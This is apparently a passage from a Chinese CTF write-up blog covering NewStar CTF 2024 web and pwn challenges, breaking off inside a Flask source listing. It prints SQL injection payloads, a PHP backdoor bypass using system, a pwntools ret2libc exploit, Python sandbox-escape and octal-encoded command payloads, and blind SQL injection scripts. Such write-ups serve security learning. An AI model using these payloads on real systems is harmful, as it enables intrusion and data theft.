<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-1<span style="color:#e6db74">&#34;/**/union/**/select/**/1,database()#
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-1<span style="color:#e6db74">&#34;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-1<span style="color:#e6db74">&#34;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;Fl4g&#39;#
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-1<span style="color:#e6db74">&#34;/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/Fl4g#
</span></span></span></code></pre></div><h3 id="复读机">复读机<a hidden class="anchor" aria-hidden="true" href="#复读机">#</a></h3>
<p>简单测试了一下xss和ssti，发现是ssti，但是手测不出来禁了什么，fenjing一把梭吧</p>
<p><img alt="30" loading="lazy" src="../../images/Newstar/2024/30.png"></p>
<h3 id="pangbai-过家家2">PangBai 过家家（2）<a hidden class="anchor" aria-hidden="true" href="#pangbai-过家家2">#</a></h3>
<p>git泄露找了好几个版本，用https://github.com/WangYihang/GitHacker这个版本的可以得到</p>
<p><img alt="32" loading="lazy" src="../../images/Newstar/2024/32.png"></p>
<p>也git下来，git add一下得到一个文件BacKd0or.v2d23AOPpDfEW5Ca.php,看一下内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Functions to handle HTML output
</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">print_msg</span>($msg) {
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;index.html&#39;</span>);
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\s*&lt;script.*&lt;\/script&gt;/s&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $content);
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/ event/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $content);
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;点击此处载入存档&#39;</span>, $msg, $content);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $content;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show_backdoor</span>() {
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;index.html&#39;</span>);
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;/assets/index.4f73d116116831ef.js&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/assets/backdoor.5b55c904b31db48d.js&#39;</span>, $content);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $content;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Backdoor
</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_POST[<span style="color:#e6db74">&#39;papa&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;TfflxoU0ry7c&#39;</span>) {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_backdoor</span>();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($_GET[<span style="color:#e6db74">&#39;NewStar_CTF.2024&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;Welcome&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^Welcome$/&#39;</span>,
</span></span><span style="display:flex;"><span>$_GET[<span style="color:#e6db74">&#39;NewStar_CTF.2024&#39;</span>])) {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print_msg</span>(<span style="color:#e6db74">&#39;PangBai loves you!&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call_user_func</span>($_POST[<span style="color:#e6db74">&#39;func&#39;</span>], $_POST[<span style="color:#e6db74">&#39;args&#39;</span>]);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print_msg</span>(<span style="color:#e6db74">&#39;PangBai hates you!&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>分析一下get需要发包的为</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NewStar<span style="color:#f92672">[</span>CTF.2024<span style="color:#f92672">=</span>Welcome%0a
</span></span></code></pre></div><p>需要进行截取，然后还有个php特性的问题</p>
<p>post发包</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>papa<span style="color:#f92672">=</span>TfflxoU0ry7c&amp;func<span style="color:#f92672">=</span>system&amp;args<span style="color:#f92672">=</span>set
</span></span></code></pre></div><p>call_user_func是构造函数，查看系统环境得到flag</p>
<p><img alt="33" loading="lazy" src="../../images/Newstar/2024/33.png"></p>
<h2 id="pwn-1">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn-1">#</a></h2>
<h3 id="ez_game">ez_game<a hidden class="anchor" aria-hidden="true" href="#ez_game">#</a></h3>
<p>用checksec检查一下，发现是64位，开了NX保护F5弹出伪代码，看一下。在func函数中发现溢出点</p>
<p>没有system字符串，也没有bin/sh,同时也开启了NX保护，说明是ret2libcROPgadget &ndash;binary ‘attachment’ &ndash;only ‘pop|ret’ 查看rdi与ret的地址</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;101.200.139.65&#39;</span>,<span style="color:#ae81ff">30806</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./a&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400783</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400509</span>
</span></span><span style="display:flex;"><span>main<span style="color:#f92672">=</span><span style="color:#ae81ff">0x400702</span>
</span></span><span style="display:flex;"><span>puts_plt<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>puts_got<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>payload1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x58</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">+</span>p64(rdi)<span style="color:#f92672">+</span>p64(puts_got)<span style="color:#f92672">+</span>p64(puts_plt)<span style="color:#f92672">+</span>p64(main)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload1)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Welcome to NewStarCTF!!!!&#39;</span>)
</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>print(hex(puts_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libcbase <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>sys <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(hex(libcbase))
</span></span><span style="display:flex;"><span>print(hex(sys))
</span></span><span style="display:flex;"><span>print(hex(binsh))
</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x58</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(rdi) <span style="color:#f92672">+</span> p64(binsh) <span style="color:#f92672">+</span> p64(sys)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload2)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img alt="31" loading="lazy" src="../../images/Newstar/2024/31.png"></p>
<h1 id="week3">week3<a hidden class="anchor" aria-hidden="true" href="#week3">#</a></h1>
<h2 id="web-2">Web<a hidden class="anchor" aria-hidden="true" href="#web-2">#</a></h2>
<h3 id="include-me">Include Me<a hidden class="anchor" aria-hidden="true" href="#include-me">#</a></h3>
<p>简单的伪协议绕过</p>
<h3 id="臭皮踩踩背">臭皮踩踩背<a hidden class="anchor" aria-hidden="true" href="#臭皮踩踩背">#</a></h3>
<p>这方面学的不多，先试试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()
</span></span></code></pre></div><p>当前环境中的 <code>__subclasses__()</code> 返回了许多类，有点类似ssti的过程，试试132可以</p>
<p>最后构造payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">132</span>]<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;cat /flag&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span></code></pre></div><p><img alt="37" loading="lazy" src="../../images/Newstar/2024/37.png"></p>
<h3 id="臭皮的计算机">臭皮的计算机<a hidden class="anchor" aria-hidden="true" href="#臭皮的计算机">#</a></h3>
<p>一开始在想异或或者条件竞争，回宿舍突然灵机一动想出来了</p>
<p>八进制进行转化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\143\141\164\040\057\146\154\141\147\047\051
</span></span></code></pre></div><p>对应的语句是</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cat /flag&#39;</span>)
</span></span></code></pre></div><h3 id="blindsql1复现">blindsql1(复现)<a hidden class="anchor" aria-hidden="true" href="#blindsql1复现">#</a></h3>
<p>一直在等官p，我想到的时间盲注一直注不出来，想拿到官p分析一下，先上我的exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>dicts <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#dicts = &#39;0123456789abcdefghijklmnopqrstuvwxyz-_{},&#39;</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2ze6bhm7y89n414z4qi0.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag_char</span>(index):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> dicts:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-1&#39;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),</span><span style="color:#e6db74">{</span>index<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)like(&#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#75715e"># 库名是students_courses_secrets</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#payload = f&#34;-1&#39;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(736563726574735F636F75727365735F73747564656E7473))),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;student_name&#39;</span>: payload}
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            start_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url, params<span style="color:#f92672">=</span>params)
</span></span><span style="display:flex;"><span>            end_time <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>            sub <span style="color:#f92672">=</span> end_time <span style="color:#f92672">-</span> start_time
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> sub <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0.5</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> char
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;请求失败: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>    char <span style="color:#f92672">=</span> get_flag_char(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> char:
</span></span><span style="display:flex;"><span>        flag <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;当前情况: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;已结束&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;最终情况: </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>上一下官p吧方法其实类似</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span>string<span style="color:#f92672">,</span>time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2ze6bhm7y89omu7vsmgr.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Bruting at </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,_-</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.01</span>) <span style="color:#75715e"># 限制速率，防止请求过快</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] Trying:&#39;</span>, c)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        tables <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;(Select(group_concat(secret_value))from(secrets)where((secret_value)like(</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">flag%</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">)))&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        char <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;(ord(mid(</span><span style="color:#e6db74">{</span>tables<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)))&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 爆破该 ascii 值</span>
</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;((</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">)in(</span><span style="color:#e6db74">{</span>ord(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">))&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据</span>
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Alice</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">and(</span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">)#&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;student_name&#39;</span>: p})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Alice&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[*]bingo:&#39;</span>,c)
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>            print(result)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>具体我的代码讲解可以看sql2的我的写法</p>
<h3 id="这照片是你吗复现">这“照片”是你吗(复现)<a hidden class="anchor" aria-hidden="true" href="#这照片是你吗复现">#</a></h3>
<p>写这题的时候完全没思路，基础功底太差了，跟着官p复现一下，先看源码的hint</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>&lt;!-- 图标能够正常显示耶! --&gt;
</span></span><span style="display:flex;"><span>&lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;
</span></span><span style="display:flex;"><span>&lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;
</span></span><span style="display:flex;"><span>&lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;
</span></span></code></pre></div><p>能获取路由但是没有中间件来支持，服务端处理文件和路由的逻辑很有可能会有漏洞。wappalyzer可以发现是<code>flask</code>的框架，测试了一下是用目录穿越的漏洞的</p>
<p><img alt="49" loading="lazy" src="../../images/Newstar/2024/49.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, make_response, render_template_string, request, redirect, send_file
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flag <span style="color:#f92672">import</span> get_random_number_string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base_key <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>secret_key <span style="color:#f92672">=</span> get_random_number_string(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>admin_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ _ <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> base_key])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(admin_pass)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>failure_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;admin&#39;</span>: admin_pass,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;amiya&#39;</span>: <span style="color:#e6db74">&#34;114514&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_token</span>(token):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> failure_count
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> failure_count <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, secret_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;admin&#39;</span>:
</span></span><span style="display:flex;"><span>            failure_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;You are not admin!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style="color:#ae81ff">401</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/home&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
